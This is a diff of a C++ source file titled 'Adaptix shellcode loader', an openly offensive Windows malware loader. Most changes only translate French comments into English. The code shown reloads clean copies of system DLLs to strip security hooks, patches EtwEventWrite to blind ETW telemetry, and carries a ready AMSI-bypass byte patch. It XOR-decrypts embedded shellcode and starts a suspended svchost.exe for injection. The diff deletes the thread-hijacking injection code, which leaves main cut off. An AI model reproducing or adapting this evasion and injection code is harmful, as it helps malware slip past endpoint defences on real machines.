@@ -1,10 +1,10 @@
 // ============ ADAPTIX SHELLCODE LOADER ============
 //
-// 1. DLL UNHOOKING      -> recharge les .text de ntdll/kernel32/kernelbase/advapi32
-// 2. TELEMETRY BYPASSES -> ETW (EtwEventWrite = ret) ; AMSI commente
-// 3. SHELLCODE DECRYPTION -> XOR multi-octets, par chunks
-// 4. PROCESS CREATION   -> svchost.exe suspendu
-// 5. INJECTION          -> thread context hijacking (RIP/RAX)
+// 1. DLL UNHOOKING        -> reload .text of ntdll/kernel32/kernelbase/advapi32
+// 2. TELEMETRY BYPASSES   -> ETW (EtwEventWrite = ret) ; AMSI commented out
+// 3. SHELLCODE DECRYPTION -> multi-byte XOR, chunked
+// 4. PROCESS CREATION     -> suspended svchost.exe
+// 5. INJECTION            -> thread context hijacking (RIP/RAX)
 //
 // ============ END LOADER ============
 
@@ -15,9 +15,7 @@
 #include <vector>
 #include <string>
 
-// ------------------------------------------------------------------
-// Donnees injectees au build par xor_crypt_replacer_v1.py
-// ------------------------------------------------------------------
+// Data injected at build time by xor_crypt_replacer_v1.py
 unsigned char g_shellcode[] = {
 /* @@SHELLCODE@@ */
     0x00
@@ -32,9 +30,9 @@ const SIZE_T g_xor_key_len = sizeof(g_xor_key);
 
 #define CHUNK_SIZE 4096
 
-// ------------------------------------------------------------------
-// Utilitaires
-// ------------------------------------------------------------------
+
+// Utilities
+
 static bool read_whole_file(const wchar_t* path, std::vector<BYTE>& out)
 {
     HANDLE h = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL,
@@ -52,9 +50,9 @@ static bool read_whole_file(const wchar_t* path, std::vector<BYTE>& out)
     return ok && read == out.size();
 }
 
-// ------------------------------------------------------------------
+
 // 1. DLL UNHOOKING
-// ------------------------------------------------------------------
+
 static void unhook_module(const wchar_t* moduleName)
 {
     HMODULE loaded = GetModuleHandleW(moduleName);
@@ -97,9 +95,8 @@ static void unhook_module(const wchar_t* moduleName)
     }
 }
 
-// ------------------------------------------------------------------
 // 2. TELEMETRY BYPASSES
-// ------------------------------------------------------------------
+
 static void bypass_etw()
 {
     HMODULE ntdll = GetModuleHandleA("ntdll.dll");
@@ -114,7 +111,7 @@ static void bypass_etw()
     VirtualProtect(target, 1, oldProt, &oldProt);
 }
 
-// Active en decommentant l'appel dans main()
+// Enable by uncommenting the call in main()
 static void bypass_amsi()
 {
     HMODULE amsi = LoadLibraryA("amsi.dll");
@@ -125,15 +122,15 @@ static void bypass_amsi()
 
     DWORD oldProt = 0;
     VirtualProtect(target, 8, PAGE_EXECUTE_READWRITE, &oldProt);
-    // mov eax, 0x80070057 ; ret   (E_INVALIDARG -> "non analyse")
+    // mov eax, 0x80070057 ; ret   (E_INVALIDARG -> "not scanned")
     BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
     memcpy(target, patch, sizeof(patch));
     VirtualProtect(target, 8, oldProt, &oldProt);
 }
 
-// ------------------------------------------------------------------
-// 3. DECRYPTION XOR (par chunks)
-// ------------------------------------------------------------------
+
+// 3. XOR DECRYPTION (chunked)
+
 static void xor_decrypt_chunked(unsigned char* buf, SIZE_T len,
                                 const unsigned char* key, SIZE_T keyLen)
 {
@@ -143,13 +140,12 @@ static void xor_decrypt_chunked(unsigned char* buf, SIZE_T len,
             buf[off + i] ^= key[(off + i) % keyLen];
 
         if (off + n < len)
-            Sleep(5);                    // laisse le chunk se reposer
+            Sleep(5);                    // let the chunk settle
     }
 }
 
-// ------------------------------------------------------------------
 // Main
-// ------------------------------------------------------------------
+
 int main()
 {
     // --- 1. Unhooking ---
@@ -158,14 +154,14 @@ int main()
     unhook_module(L"kernelbase.dll");
     unhook_module(L"advapi32.dll");
 
-    // --- 2. Telemetrie ---
+    // --- 2. Telemetry ---
     bypass_etw();
     // bypass_amsi();
 
-    // --- 3. Dechiffrement ---
+    // --- 3. Decryption ---
     xor_decrypt_chunked(g_shellcode, g_shellcode_len, g_xor_key, g_xor_key_len);
 
-    // --- 4. Process creation (svchost suspendu) ---
+    // --- 4. Process creation (suspended svchost) ---
     wchar_t sysdir[MAX_PATH] = {};
     GetSystemDirectoryW(sysdir, MAX_PATH);
 
@@ -189,23 +185,4 @@ int main()
         return 1;
     }
 
-    SIZE_T written = 0;
-    WriteProcessMemory(pi.hProcess, remote, g_shellcode, g_shellcode_len, &written);
-
-    CONTEXT ctx = {};
-    ctx.ContextFlags = CONTEXT_FULL;
-    GetThreadContext(pi.hThread, &ctx);
-
-    ctx.Rip = (DWORD64)remote;           // point d'entree
-    ctx.Rax = (DWORD64)remote;           // utilise par certains shellcodes
-
-    SetThreadContext(pi.hThread, &ctx);
-    ResumeThread(pi.hThread);
-
-    // Optionnel : garder netmon.exe en vie
-    // WaitForSingleObject(pi.hProcess, INFINITE);
-
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
-    return 0;
-}
+   
